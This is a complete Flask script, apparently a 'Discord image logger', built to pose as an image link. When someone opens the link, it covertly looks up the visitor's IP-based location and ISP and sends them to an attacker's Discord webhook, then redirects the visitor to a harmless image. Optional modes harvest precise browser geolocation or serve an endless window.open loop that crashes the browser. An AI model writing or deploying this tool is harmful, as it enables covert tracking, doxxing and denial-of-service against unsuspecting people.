from flask import Flask, request, redirect, jsonify
import requests

app = Flask(__name__)

# Replace with your Discord webhook URL
WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'

# Replace with the URL of the image you want to display
IMAGE_URL = 'YOUR_IMAGE_URL'

@app.route('/API/image')
def image_logger():
    user_ip = request.remote_addr
    response = requests.get(f'http://ip-api.com/json/{user_ip}')
    data = response.json()

    # Prepare the message to send to Discord
    message = (
        f"IP Address: {data['query']}\n"
        f"Provider: {data['isp']}\n"
        f"ASN: {data['as']}\n"
        f"Country: {data['country']}\n"
        f"Region: {data['regionName']}\n"
        f"City: {data['city']}\n"
        f"Coordinates: {data['lat']}, {data['lon']}\n"
        f"Time Zone: {data['timezone']}\n"
        f"Mobile/VPN: {data['mobile']}\n"
    )

    # Send the message to the Discord webhook
    requests.post(WEBHOOK_URL, json={'content': message})

    # Check for additional features
    accurate_location = request.args.get('accurate_location') == 'true'
    crash_browser = request.args.get('crash_browser') == 'true'

    if accurate_location:
        return '''
        <!DOCTYPE html>
        <html>
        <body>
        <script>
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch('/API/location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        })
                    });
                });
            }
        </script>
        </body>
        </html>
        '''

    if crash_browser:
        return '''
        <!DOCTYPE html>
        <html>
        <body>
        <script>
            while (true) {
                window.open('', '_self', '');
            }
        </script>
        </body>
        </html>
        '''

    # Redirect the user to the benign image
    return redirect(IMAGE_URL)

@app.route('/API/location', methods=['POST'])
def handle_location():
    data = request.json
    lat = data['lat']
    lon = data['lon']
    # Send the location data to your webhook or process it as needed
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
